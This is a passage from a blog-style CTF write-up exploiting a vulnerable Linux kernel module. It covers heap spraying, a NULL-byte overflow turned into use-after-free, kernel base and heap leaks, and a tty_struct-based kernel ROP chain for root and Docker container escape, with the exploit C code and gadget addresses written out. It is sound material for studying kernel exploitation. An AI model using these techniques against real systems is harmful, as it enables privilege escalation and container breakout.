<figure class="figure-image figure-image-fotolife mceNonEditable" title="user_key_payload in kmalloc-32"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163405.png" alt="user_key_payload in kmalloc-32" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">user_key_payload in kmalloc-32</figcaption></figure></p>
<p>BTW <code>user_key_payload</code> are not placed in next to each other 。We can guess that <code>CONFIG_SLAB_FREELIST_RANDOMIZE</code> or something is enabled in this kernel。 Then, spray <code>poll_list</code> in <code>kmalloc-4k</code> and <code>kmalloc-32</code>:</p>
<div class="codeblock-title">alloc_poll_list.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  assign_to_core(0);
  for (int ix = 0; ix != NUM_POLLLIST_ALLOC; ++ix) {
    if(pthread_create(&amp;threads[ix], NULL, alloc_poll_list, &amp;just_fd) != 0) errExit(&quot;pthread_create&quot;);
  }
</code></pre>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="search for poll_list"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163411.png" alt="search for poll_list" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">search for poll_list</figcaption></figure></p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="poll_list in kmalloc-4k"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163418.png" alt="poll_list in kmalloc-4k" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">poll_list in kmalloc-4k</figcaption></figure></p>
<p>This time, we <code>poll</code> for the event <code>POLLERR</code>(<code>=0x0008</code>), and we use <code>fd == 0x00000004</code>, so we can use bytes <code>0x0000000400080000</code> as a needle for search (<code>pt -sb 08000000040000000800000004000000 -align 16</code>. though <code>pt -sb fe01000004000000 -align 8</code> would be better). BTW, I noticed that <code>struct pollfd[]</code> in <code>poll_list</code> is not aligned. Due to this unalignment, I spent crazy times on finding target <code>poll_list</code>. And I forgot saying that this <code>pt</code> command means <a href="https://github.com/martinradev/gdb-pt-dump">gdb-pt-dump</a>.</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="pahole of pollfd"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163424.png" alt="pahole of pollfd" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">pahole of pollfd</figcaption></figure>
<figure class="figure-image figure-image-fotolife mceNonEditable" title="pahole of poll_list"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163430.png" alt="pahole of poll_list" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">pahole of poll_list</figcaption></figure></p>
<p>Good. Each structures seems to be allocated in intended size of caches for now.
Under this situation, let’s invoke the NULL-byte overflow.</p>
<div class="codeblock-title">overflow.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">void nullbyte_overflow(void) {
  assert(cormon_fd &gt;= 2);
  memset(cormon_buf, 'B', 0x1000 + 0x20);
  strcpy((char*)cormon_buf + 1, &quot;THIS_IS_CORMON_BUFFER&quot;);
  *cormon_buf = 0x00;

  if(write(cormon_fd, cormon_buf, 0x1000) != -1) errExit(&quot;nullbyte_overflow&quot;);
  errno = 0;
}
</code></pre>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="search for NULL-overflowed poll_list"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163436.png" alt="search for NULL-overflowed poll_list" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">search for NULL-overflowed poll_list</figcaption></figure></p>
<p>Hmm, it seems that a slab object in next to vulnerable heap object is NULL-byte overflowed, but apparently this object is not <code>struct poll_list</code> (cuz <code>.len</code> member is invalid). After try and errors, things went to good when I changed the number of spray of <code>struct poll_list</code> as <code>0x10 -&gt; 0x10-2</code>. When you do kheap spray, this kind of small adjustment is important, I believe:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="actually, poll_list is NULL-byte overflowed!"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163442.png" alt="actually, poll_list is NULL-byte overflowed!" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">actually, poll_list is NULL-byte overflowed!</figcaption></figure></p>
<p>Actually, <code>struct poll_list</code> is allocated in next to the buffer allocated in <code>cormon_proc_write()</code>, and first byte of <code>poll_list.next</code> is NULL-byte overflowed. FYI, author’s writeup told me that you should control which CPU core to use when spraying by <code>sched_setaffinity()</code>. Good point, actually. Slab cache is per-CPU. Genius.
Here, it is important that the addr(<code>0xffff888007617500</code>) pointed to by overwritten <code>next</code> pointer must be <code>user_key_payload</code>, which we prepared in kmalloc-32 in the first step. And the first member <code>user_key_payload.rcu</code> must be NULL. Let me check…:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="user_key_payload is pointed to by poll_list.next"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163448.png" alt="user_key_payload is pointed to by poll_list.next" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">user_key_payload is pointed to by poll_list.next</figcaption></figure></p>
<p>Perfect. After that, we just wait for seconds to timeout <code>poll</code> syscall, and <code>poll_list</code> are <code>kfree</code>ed in order from the head. <code>user_key_payload</code> is also freed. So we just allocate new structure as you like on this key. The structure should be in <code>kmalloc-32</code>, and should contains kptr. This time, we use <code>seq_operations</code>:</p>
<div class="codeblock-title">seq_operations.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  // Check all keys to leak kbase via `seq_operations`
  char keybuf[0x100] = {0};
  ulong leaked = 0;
  for (int ix = 0; ix != NUM_KEY_SPRAY; ++ix) {
    memset(keybuf, 0, 0x100);
    if(keyctl_read(keys[ix], keybuf, 0x100) &lt; 0) errExit(&quot;keyctl_read&quot;);
    if (strncmp(keybuf, &quot;AAAA&quot;, 4) != 0) {
      leaked = *(ulong*)keybuf;
    }
  }
  if (leaked == 0) {
    puts(&quot;[-] Failed to leak kbase&quot;);
    exit(1);
  }
  printf(&quot;[!] leaked: 0x%lx\n&quot;, leaked);
</code></pre>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="panic, but leak fails"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163454.png" alt="panic, but leak fails" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">panic, but leak fails</figcaption></figure></p>
<p>U~~~~n, it panics, so we achieved some evil thing, but leak is not performed. Let’s dig into using gdb:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="the former is overflowed poll_list, the latter is user_key_payload as seq_operations"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163501.png" alt="the former is overflowed poll_list, the latter is user_key_payload as seq_operations" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">the former is overflowed poll_list, the latter is user_key_payload as seq_operations</figcaption></figure></p>
<p>The former is overflowed <code>poll_list</code>, and the latter is freed <code>user_key_payload</code> which was previously linked by <code>poll_list.next</code>, and now is <code>seq_operations</code>. It looks perfect, no strange points. I guessed that we have to saturate <code>kmalloc-32</code> more and more beforehand, and I tried to spray more <code>user_key_payload</code>. But I encountered below error:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="Disk quota exceeded"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163507.png" alt="Disk quota exceeded" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">Disk quota exceeded</figcaption></figure></p>
<p>I haven’t researched, but it seems keys cannot be allocated many times. So I did more spray using <code>seq_operations</code>. In addition, I changed exploit to allocate <code>seq_operations</code> immediately right after every <code>pthread_join()</code>.
However, I couldn’t leak kbase by <code>keyctl_read()</code>…!:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="somehow, kernel pointer cannot be leaked"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163513.png" alt="somehow, kernel pointer cannot be leaked" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">somehow, kernel pointer cannot be leaked</figcaption></figure></p>
<p>After 80years of trouble, I noticed below description in manpage of <code>keyctl_read</code>:</p>
<div class="codeblock-title">keyctl_read.man</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">RETURN VALUE
       On  success  keyctl_read()  returns  the amount of data placed into the buffer.  If the buffer was too small, then the size of
       buffer required will be returned, and the contents of the buffer may have been overwritten in some undefined way.
</code></pre>
<p>Ah, if you pass small buffer as an argument, this syscall ends in undefined behaviour… Okay, I changed the size of buffer for <code>keyctl_read()</code> enough large (&gt;=0x4330 in this case) and tried again:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="kbase leak success after extending buf size!"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163520.png" alt="kbase leak success after extending buf size!" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">kbase leak success after extending buf size!</figcaption></figure></p>
<p>Seems good…!</p>
<h3>7. leak kheap via <code>tty_struct</code> / <code>tty_file_private</code></h3>
<p>We achieved kbase leak. Okay then, what should I do. I once assumed that I can free <code>user_key_payload</code> (aka <code>seq_operations</code> in this time) as <code>user_key_payload</code>, overwrite function pointers in <code>seq_operations</code> using <code>setxattr</code>, then I can get RIP.
But I realized this kernel uses KPTI, so we have to do stack pivot. It means we need to leak kheap addr.</p>
<p>For the time being, I want to leak kheap. Fortunatelly, an object (previously <code>user_key_payload</code>, and now <code>seq_operations</code>) can be freed and re-allocated as new object, which we can use to leak something again. Okay let’s exploit <code>tty_struct</code>. When you <code>open</code> <code>/dev/ptmx</code>, it reaches below path:</p>
<div class="codeblock-title">drivers/tty/pty.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">struct tty_file_private {
    struct tty_struct *tty;
    struct file *file;
    struct list_head list;
};

static int ptmx_open(struct inode *inode, struct file *filp)
{
    struct tty_struct *tty;
    int retval;
    ...
    retval = tty_alloc_file(filp);
    ...
    tty = tty_init_dev(ptm_driver, index);
    ...
    tty_add_file(tty, filp);
    ...
}

int tty_alloc_file(struct file *file)
{
    struct tty_file_private *priv;

    priv = kmalloc(sizeof(*priv), GFP_KERNEL);
    file-&gt;private_data = priv;
    return 0;
}
void tty_add_file(struct tty_struct *tty, struct file *file)
{
    struct tty_file_private *priv = file-&gt;private_data;

    priv-&gt;tty = tty;
    priv-&gt;file = file;
    ...
}
</code></pre>
<p>There <code>tty_alloc_file()</code> allocate <code>struct tty_file_private</code> for <code>private_data</code> member of <code>struct file</code> of <code>/dev/ptmx</code>.
It is allocated in <code>kmalloc-32</code>. Then, <code>tty_init_dev()</code> allocates <code>struct tty_struct</code> from <code>kmalloc-1024</code>. And <code>tty_add_file()</code> assigns addr of <code>struct tty_struct</code> to <code>struct tty_file_private</code>. In short, you can leak addr of <code>kmalloc-1024</code> by leaking the content of <code>tty_file_private</code> in <code>kmalloc-32</code>:</p>
<div class="codeblock-title">leak_heap.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  // Free all keys except UAFed key
  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
    if (keys[ix] != uafed_key) {
      if (keyctl_revoke(keys[ix]) != 0) errExit(&quot;keyctl_revoke&quot;);
      if (keyctl_unlink(keys[ix], KEY_SPEC_PROCESS_KEYRING) != 0) errExit(&quot;keyctl_unlink&quot;);
    }
  }

  // Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
    if (open(&quot;/dev/ptmx&quot;, O_RDWR) &lt;= 2) errExit(&quot;open tty&quot;);
  }

  // Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
  memset(keybuf, 0, 0x5000);
  if(keyctl_read(uafed_key, keybuf, 0x5000) &lt;= 0) errExit(&quot;keyctl_read&quot;);
  ulong km1024_leaked = 0;
  ulong *tmp = (ulong*)keybuf + 1;
  for (int ix = 0; ix != 0x4330/8 - 2 - 1; ++ix) {
    if ((tmp[ix] &gt;&gt; (64-4*4)) == 0xFFFF &amp;&amp; tmp[ix+2] == tmp[ix+3] &amp;&amp; tmp[ix+2] != 0 &amp;&amp; (tmp[ix] &amp; 0xFF) == 0x00) { // list_head's next and prev are same
      km1024_leaked = tmp[ix];
      printf(&quot;[!] \t+0: 0x%lx (tty)\n&quot;, tmp[ix]);
      printf(&quot;[!] \t+1: 0x%lx (*file)\n&quot;, tmp[ix + 1]);
      printf(&quot;[!] \t+2: 0x%lx (list_head.next)\n&quot;, tmp[ix + 2]);
      printf(&quot;[!] \t+3: 0x%lx (list_head.prev)\n&quot;, tmp[ix + 3]);
      break;
    }
  }
  if (km1024_leaked == 0) errExit(&quot;Failed to leak kmalloc-1024&quot;);
  printf(&quot;[!] leaked kmalloc-1024: 0x%lx\n&quot;, km1024_leaked);
</code></pre>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="kheap leak success"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163526.png" alt="kheap leak success" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">kheap leak success</figcaption></figure></p>
<p>Seems good! But when we check at the addr leaked as <code>tty</code>, the first member was not a magic number(<code>0x5401</code>), so this is not our target pointer. During many tries, I cloud leak the exact addr of <code>tty</code> only once in every 50 tries. What’s wrong…
Below is UAFed <code>user_key_payload</code> when I free all other keys and sprayed <code>tty_file_private</code> in kmalloc-32:
<figure class="figure-image figure-image-fotolife mceNonEditable" title="UAFed user_key_payload in kmalloc-32"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163534.png" alt="UAFed user_key_payload in kmalloc-32" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">UAFed user_key_payload in kmalloc-32</figcaption></figure></p>
<p>The first 32bytes are <code>user_key_payload</code>, and there is <code>seq_operations</code> on it used to leak kbase. We can leak only <code>0x4330</code> bytes of content below <code>user_key_payload</code> (this is because <code>user_key_payload.datalen</code> is overwritten by 2bytes of <code>single_next</code> when we allocated in as UAF).
When we look around there, we can see freed <code>seq_operations</code>. <code>0xa748dc1b1f063d98</code> would be the encrypted pointer of free slab cache’s linked list (we can guess that <code>CONFIG_SLAB_FREELIST_HARDENED</code> is enabled). From these things, I guessed that <code>seq_operations</code> are unintentionally allocated around the UAFed key due to small number of key spraying. So I just increased the number of keys to spray:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="kmalloc-32 after increasing num of spraying"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924154912.png" alt="kmalloc-32 after increasing num of spraying" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">kmalloc-32 after increasing num of spraying</figcaption></figure></p>
<p>It might be coincident, but random QWORD(it is encrypted slab pointer) and <code>0x41414141</code> (payload of keys) are placed in the same object, so sprayed keys are allocated in next UAFed key, and freed as intended. But it is remained freed unintentionally. So the num of <code>tty_file_private</code> spraying is small…? I tried, but failed. So sad…</p>
<p>After 512 years of hard time, I just checked my exploit:</p>
<div class="codeblock-title">c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">#define NUM_KEY_SPRAY 80 + 10
#define NUM_POLLFD 30 + 510 + 1 // stack, kmalloc-4k, kmalloc-32
#define NUM_POLLLIST_ALLOC 0x10 - 0x1

key_serial_t keys[NUM_KEY_SPRAY * 5] = {0};
for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {...}
for (int ix = 0; ix != NUM_KEY_SPRAY * 9; ++ix) {...}
</code></pre>
<p><strong>馬鹿！！大馬鹿！おまわりさん、馬鹿はこいつです！捕まえちゃってください！</strong> Macro is no more than a string replacement, so <code>NUM_KEY_SPRAY * 2</code> is evaluated as <code>80 + 10 * 2</code>!! It must NOT work as I intended!
Okay, I fixed the bug and allocated enough number of <code>tty_file_private</code>. The heap right after leaking kbase looks below (all keys are not freed yet. and <code>seq_operations</code> is on UAFed key):</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="UAFed key is surrounded by many other user_key_payload, seems good"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163541.png" alt="UAFed key is surrounded by many other user_key_payload, seems good" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">UAFed key is surrounded by many other user_key_payload, seems good</figcaption></figure></p>
<p>You can see UAFed key at the top, and many following it (payload=<code>AAAAA</code>). Ideal. But not works… Why… Retrospect the source code around <code>keyXXX</code>:</p>
<div class="codeblock-title">security/keys/keyring.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">/*
 * Clean up a keyring when it is destroyed.  Unpublish its name if it had one
 * and dispose of its data.
 *
 * The garbage collector detects the final key_put(), removes the keyring from
 * the serial number tree and then does RCU synchronisation before coming here,
 * so we shouldn't need to worry about code poking around here with the RCU
 * readlock held by this time.
 */
static void keyring_destroy(struct key *keyring) {...}
</code></pre>
<p><strong>A!! Not <code>unlink()</code>, but GC(<code>security/keys/gc.c</code>) actually frees keys…!</strong> So what we had to do is just waiting for a second before spraying <code>tty_file_private</code>? I tried:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163547.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure>
<figure class="figure-image figure-image-fotolife mceNonEditable" title="kheap leak success after waiting GC for a second"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163553.png" alt="kheap leak success after waiting GC for a second" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">kheap leak success after waiting GC for a second</figcaption></figure></p>
<p>Seems good~~~~~~~.</p>
<h3>8. get RIP by overwriting <code>tty_struct.ops</code></h3>
<p>We leaked kheap, so next we wanna get RIP. Ofcourse we can sleep well even if we don’t get RIP.
Now, we have UAFed <code>user_key_payload</code> (and <code>tty_file_private</code> on it) in <code>kmalloc-32</code>. By re-utilizing this UAF, let’s achieve UAF write. Specifically, when <code>poll_list</code> have list of <code>kmalloc-1024 --&gt; kmalloc-32</code>, we can overwrite <code>poll_list</code> in <code>kmalloc-32</code> using the UAF, then we can write the addr of <code>tty_struct(kmalloc-1024)</code> to <code>poll_list.next</code> pointer. If we free <code>poll_list</code>, then victim <code>tty_struct</code> can be freed. After achieving UAF of <code>tty_struct</code>, we can just overwrite <code>ops</code> in <code>tty_struct</code>. It should work, I wish…!
So coressponding exploit code is below (fancy ready-made~~)</p>
<div class="codeblock-title">.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  // Free `seq_operations`, one of which is `user_key_payload`
  for (int ix = NUM_SEQOPERATIONS - NUM_FREE_SEQOPERATIONS; ix != NUM_SEQOPERATIONS; ++ix) {
    close(seqops_fd[ix]);
  }
  puts(&quot;[+] Freeed seq_operations&quot;);
  
  // Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
  assign_to_core(2);
  neverend = 1;
  puts(&quot;[+] spraying `poll_list` in kmalloc-32...&quot;);
  num_threads = 0;
  for (int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
    arg-&gt;fd = just_fd; arg-&gt;id = ix;
    arg-&gt;timeout_ms = 3000; // must 1000 &lt; timeout_ms, to wait key GC
    arg-&gt;num_size = 30 + 2;
    if(pthread_create(&amp;threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(&quot;pthread_create&quot;);
  }

  // Revoke UAFed key, which is on `poll_list` in kmalloc-32
  puts(&quot;[+] Freeing UAFed key...&quot;);
  free_key(uafed_key);
  sleep(1);

  // Spray keys on UAFed `poll_list`
  puts(&quot;[+] spraying keys in kmalloc-32&quot;);
  assert(num_keys == 0);
  {
    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    memset(key_payload, 'X', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
     _alloc_key_prefill_ulong_val = 0xDEADBEEF;

    for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
      alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
    }
  }
</code></pre>
<p>It writes <code>0xDEADBEEF</code> by <code>setxattr()</code> before allocating <code>user_key_payload</code>s. In this way, <code>user_key_payload.rcu</code> get this value, and the value of <code>poll_list.next</code> would also become this value:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="Kernel memory overwrite attempt detected to SLUB object"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163558.png" alt="Kernel memory overwrite attempt detected to SLUB object" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">Kernel memory overwrite attempt detected to SLUB object</figcaption></figure></p>
<p>??? <code>Kernel memory overwrite attempt detected to SLUB object 'filp'</code>, it says. Reading source code, I know that this sentence is shown when <code>CONFIG_HARDENED_USERCOPY</code> is enabled:</p>
<div class="codeblock-title">mm/usercopy.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">void __noreturn usercopy_abort(const char *name, const char *detail,
			       bool to_user, unsigned long offset,
			       unsigned long len)
{
    pr_emerg(&quot;Kernel memory %s attempt detected %s %s%s%s%s (offset %lu, size %lu)!\n&quot;,
       to_user ? &quot;exposure&quot; : &quot;overwrite&quot;,
       to_user ? &quot;from&quot; : &quot;to&quot;,
       name ? : &quot;unknown?!&quot;,
       detail ? &quot; '&quot; : &quot;&quot;, detail ? : &quot;&quot;, detail ? &quot;'&quot; : &quot;&quot;,
       offset, len);
    BUG();
}
void __check_heap_object(const void *ptr, unsigned long n, struct page *page, bool to_user)
{
    ...
    usercopy_abort(&quot;SLUB object&quot;, s-&gt;name, to_user, offset, n);
}
</code></pre>
<p>After several tries, the kernel crashes after detecting overwrites toward <code>kmalloc-256</code> cache such as <code>filp</code> or <code>worker_pool</code>. This is just my guessing: We freed <code>user_key_payload</code> right after creating threads to spraying <code>poll_list</code>, so <code>user_key_payload</code>s are freed before allocating <code>poll_list</code> on UAFed object. It ends in double free cuz <code>seq_operations</code> on UAFed object is also freed, and heap get corrupted, I guess. So I just <code>sleep</code>ed for a while after creating threads, and this error never happend. <strong>Great guessing is, great</strong>.</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="DEADBEEF!"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163059.png" alt="DEADBEEF!" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">DEADBEEF!</figcaption></figure></p>
<p>Dead beef, pretty well! Then I removed the dead beef and wrote the addr of <code>tty_struct</code> which was used to leak kheap. After this UAF, I sprayed <code>user_key_payload</code> of size <code>0x1000</code> to fill them with magic number of <code>tty_struct</code> (<code>0x5401</code>):</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="got a RIP"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163604.png" alt="got a RIP" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">got a RIP</figcaption></figure></p>
<p>Ideal! I overwrite everything including <code>tty_struct.ops</code> with <code>0x5401</code>, so the kernel crashes as intended! We got RIP.</p>
<h3>9. get root by kROP on <code>tty_struct</code> itself</h3>
<p>By <code>ioctl()</code>ing to TTY, register values look like below right after the <code>jmp</code>:</p>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="register values after jmp-ing to ioctl"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924160250.png" alt="register values after jmp-ing to ioctl" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">register values after jmp-ing to ioctl</figcaption></figure></p>
<p>We can control 4byte of <code>RBX, RCX, RSI</code> as 2nd argument, and 8byte of <code>RDX, R8, R12</code> as 3rd argument.
<code>RDI</code>, <code>RBP</code>, and <code>R14</code> points to <code>tty_struct</code> itself. To do stack pivot, we wanna do <code>push RXX, JMP RYY, ROP RSP</code> or something, we can’t use <code>RSI</code> cuz we can only control 4byte of it.
Ladies and Gentlemen, please remember: <strong><code>tty_struct</code> is ideal for kROP</strong>:</p>
<div class="codeblock-title">payload.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">    char *key_payload = malloc(0x1000);
    ulong *buf = (ulong*)key_payload;
    buf[0] = 0x5401; // magic, kref (later `leave`ed and become RBP)
    buf[1] = KADDR(0xffffffff8191515a); // dev (later become ret addr of `leave` gadget, which is `pop rsp`)
    buf[2] = km1024_leaked + 0x50 + 0x120; // driver (MUST BE VALID) (later `pop rsp`ed)
    buf[3] = km1024_leaked + 0x50; // ops

    ulong *ops = (ulong*)(key_payload + 0x50);
    for (int ix = 0; ix != 0x120 / 8; ++ix) { // sizeof tty_operations
      ops[ix] = KADDR(0xffffffff81577609); // pop rsp
    }

    ulong *rop = (ulong*)((char*)ops + 0x120);
    *rop++ = ...

    assert((ulong)rop - (ulong)key_payload &lt; 516);
</code></pre>
<p>First, we overwrite <code>ops</code> to make it point to <code>tty_struct + 0x50</code>. We spray the addr of <code>leave</code> gadget as a fake vtable around there. Then, <code>leave</code> pops addr of <code>tty_struct</code> into <code>RSP</code> because <code>RBP</code> has the value of <code>tty_struct</code> itself.
After that, <code>RET</code> would returns to the addr in <code>tty_struct + 8</code>. Here is <code>tty_struct.dev</code> pointer, and this pointer is allowed to be broken. So you can just put the addr <code>tty_struct + 0x50 + 0x120</code>. Finally, you can construct your ROP chain at <code>tty_struct + 0x50 + 0x120</code> as you like.
This structure is just for kROP. Miraculously, this kROP can work without corrupting magic number and pointers which must be kept clean (such as <code>+0x10: driver</code>). Great structure, really.</p>
<p>[EDIT] If you want to know the details of this kROP technique, you can reffer to <a href="https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md">my GitHub</a>, where I describe it more deeply.</p>
<p>[EDIT] I realized there is useful gadget in kernel: <code>0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;</code>. It is equivalent to <code>mov rsp, rdx</code>. As stated above, <code>RDX</code> can be fully controlled by 3rd argument of <code>ioctl()</code>. So it might be the case that you don’t have to do this <em>2 phased kROP</em>. But I still love this kROP, it is wonderful :)</p>
<p>ROP would look like below:</p>
<div class="codeblock-title">rop.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  *rop++ = KADDR(0xffffffff81906510); // pop rdi
  *rop++ = 0;
  *rop++ = KADDR(0xffffffff810ebc90); // prepare_kernel_cred

  *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
  *rop ++ = 0;
  *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
  *rop++ = KADDR(0xffffffff810eba40); // commit_creds

  *rop++ = KADDR(0xffffffff81c00ef0 + 0x16); // swapgs_restore_regs_and_return_to_usermode + 0x16
                                             // mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
  *rop++ = 0;
  *rop++ = 0;
  *rop++ = (ulong)NIRUGIRI;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = (ulong)krop_stack + KROP_USTACK_SIZE / 2;
  *rop++ = user_ss;
</code></pre>
<p><figure class="figure-image figure-image-fotolife mceNonEditable" title="got a ROOT"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924160243.png" alt="got a ROOT" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable">got a ROOT</figcaption></figure></p>
<p>ROOT!</p>
<h3>10. container escape</h3>
<p>We have not finished all yet. We a still in a container, and have to escape from it. Actually, I have no knowledge from here. Yes, just cheat. I start just copying from now on. Meaningfull copying. Stupid copying.
Although, there are no hard things if we have a root. <code>setns()</code> syscall is restricted in a docker container, we just move to only other filesystem namespace. Like below:</p>
<div class="codeblock-title">abst.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">// To get a root...?
commit_cred(prepare_kernel_cred(0));

// To escape from container(fs)...?
switch_task_namespaces(find_task_vpid(1), init_nsproxy);
current-&gt;fs = copy_fs_struct(init_fs);
</code></pre>
<p>That’s it! yatta~~~~~</p>
<div class="codeblock-title">rop.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  *rop++ = KADDR(0xffffffff81906510); // pop rdi
  *rop++ = 1; // init process in docker container
  *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid
  *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
  *rop ++ = 0;
  *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
  *rop++ = KADDR(0xffffffff819b21d3); // pop rsi
  *rop++ = KADDR(0xffffffff8245a720); // &amp;init_nsproxy
  *rop++ = KADDR(0xffffffff810ea4e0); // switch_task_namespaces

